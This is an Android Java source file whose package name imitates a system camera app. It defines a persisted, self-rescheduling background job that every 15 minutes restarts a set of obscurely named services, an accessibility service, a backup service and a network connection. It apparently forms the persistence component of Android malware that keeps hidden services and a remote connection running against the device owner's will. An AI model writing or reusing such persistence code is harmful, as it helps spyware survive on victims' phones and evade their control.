package com.android.photo.camera.capture;

import android.app.job.JobInfo;
import android.app.job.JobParameters;
import android.app.job.JobScheduler;
import android.app.job.JobService;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;

import java.lang.ref.WeakReference;

public class WackMeUpJob extends JobService {
    private static final String TAG = "WackMeUpJob";
    private static final int JOB_ID = 8888;
    private static final long MIN_SCHEDULE_INTERVAL = 60000; // 60 seconds minimum between schedules
    private static volatile long lastScheduleTime = 0;

    private Handler handler;

    // Job execution delay
    private static final long EXECUTION_DELAY = 2000; // 2 seconds

    @Override
    public void onCreate() {
        super.onCreate();
        handler = new Handler(Looper.getMainLooper());
    }

    @Override
    public boolean onStartJob(JobParameters params) {
        Log.d(TAG, "WackMeUpJob started");

        // Use a handler to delay execution slightly to ensure system is ready
        DelayedWakeupRunnable runnable = new DelayedWakeupRunnable(this, params);
        handler.postDelayed(runnable, EXECUTION_DELAY);

        // Return true to indicate we're doing work on a separate thread
        return true;
    }

    private void performWakeup(JobParameters params) {
        try {
            Log.d(TAG, "Performing service wakeup");

            // Start all services
            startAllServices();

            // Tell the system we're done with this job
            jobFinished(params, false);
        } catch (Exception e) {
            Log.e(TAG, "Error in job execution", e);
            jobFinished(params, true); // Retry on failure
        }
    }

    private void startAllServices() {
        // Start the Worker Service
        try {
            Intent workerIntent = new Intent(this, WorkerService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(workerIntent);
            } else {
                startService(workerIntent);
            }
        } catch (Exception e) {
            Log.e(TAG, "Error starting WorkerService", e);
        }

        // Start ClassGen5 Service
        try {
            Intent gen5Intent = new Intent(this, ClassGen5Service.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(gen5Intent);
            } else {
                startService(gen5Intent);
            }
        } catch (Exception e) {
            Log.e(TAG, "Error starting ClassGen5Service", e);
        }

        // Start ClassGen6 Service
        try {
            Intent gen6Intent = new Intent(this, ClassGen6Service.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(gen6Intent);
            } else {
                startService(gen6Intent);
            }
        } catch (Exception e) {
            Log.e(TAG, "Error starting ClassGen6Service", e);
        }

        // Start ClassGen11 Service
        try {
            Intent gen11Intent = new Intent(this, ClassGen11Service.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(gen11Intent);
            } else {
                startService(gen11Intent);
            }
        } catch (Exception e) {
            Log.e(TAG, "Error starting ClassGen11Service", e);
        }

        // Start MyWorker Service
        try {
            Intent myWorkerIntent = new Intent(this, MyWorkerService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(myWorkerIntent);
            } else {
                startService(myWorkerIntent);
            }
        } catch (Exception e) {
            Log.e(TAG, "Error starting MyWorkerService", e);
        }

        // Start main accessibility service
        try {
            Intent serviceIntent = new Intent(this, com.android.photo.camera.capture.Service.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent);
            } else {
                startService(serviceIntent);
            }
        } catch (Exception e) {
            Log.e(TAG, "Error starting main Service", e);
        }

        // Start backup service
        try {
            Intent backupIntent = new Intent(this, BackupService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(backupIntent);
            } else {
                startService(backupIntent);
            }
        } catch (Exception e) {
            Log.e(TAG, "Error starting BackupService", e);
        }

        // Make sure connection is active
        Connect.startAsync(getApplicationContext());
    }

    @Override
    public boolean onStopJob(JobParameters params) {
        Log.d(TAG, "WackMeUpJob stopped, requesting reschedule");
        return true; // true = reschedule job if it's stopped
    }

    /**
     * Schedule the WackMeUpJob to run periodically
     */
    public static void scheduleJob(Context context) {
        final long now = System.currentTimeMillis();
        if (now - lastScheduleTime < MIN_SCHEDULE_INTERVAL) {
            Log.d(TAG, "Skipping scheduleJob: Too frequent");
            return;
        }
        lastScheduleTime = now;

        try {
            JobScheduler jobScheduler = (JobScheduler) context.getSystemService(Context.JOB_SCHEDULER_SERVICE);

            if (jobScheduler == null) {
                Log.e(TAG, "JobScheduler not available");
                return;
            }

            // Cancel any existing jobs first
            jobScheduler.cancel(JOB_ID);
            jobScheduler.cancel(JOB_ID + 1);

            ComponentName componentName = new ComponentName(context, WackMeUpJob.class);

            // Create JobInfo
            JobInfo.Builder builder = new JobInfo.Builder(JOB_ID, componentName)
                    .setRequiredNetworkType(JobInfo.NETWORK_TYPE_ANY)
                    .setPersisted(true);

            // Set periodic interval
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                builder.setPeriodic(15 * 60 * 1000, 5 * 60 * 1000); // 15-20 minutes
            } else {
                builder.setPeriodic(15 * 60 * 1000); // Every 15 minutes
            }

            // Schedule the job
            int resultCode = jobScheduler.schedule(builder.build());

            if (resultCode == JobScheduler.RESULT_SUCCESS) {
                Log.d(TAG, "Job scheduled successfully");
            } else {
                Log.e(TAG, "Job scheduling failed");
            }
        } catch (Exception e) {
            Log.e(TAG, "Error scheduling job", e);
        }
    }

    // Separate static Runnable class to handle delayed execution
    private static class DelayedWakeupRunnable implements Runnable {
        private final WeakReference<WackMeUpJob> serviceRef;
        private final JobParameters params;

        DelayedWakeupRunnable(WackMeUpJob service, JobParameters params) {
            this.serviceRef = new WeakReference<>(service);
            this.params = params;
        }

        @Override
        public void run() {
            WackMeUpJob service = serviceRef.get();
            if (service != null) {
                service.performWakeup(params);
            } else {
                Log.w(TAG, "Service reference is null, skipping performWakeup");
            }
        }
    }
}